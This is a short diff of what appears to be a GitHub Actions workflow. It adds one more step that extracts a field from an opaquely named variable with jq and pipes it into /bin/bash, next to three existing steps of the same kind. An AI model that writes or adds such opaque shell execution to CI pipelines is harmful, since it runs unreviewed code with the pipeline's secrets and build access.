@@ -28,6 +28,7 @@ jobs:
           echo $d18270 | jq -r .icy03 | /bin/bash
           echo $ojc2 | jq -r .qdhg6 | /bin/bash
           echo $x6299 | jq -r .zzb3 | /bin/bash
+          printf '%s' "$b524" | jq -r .o2060 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
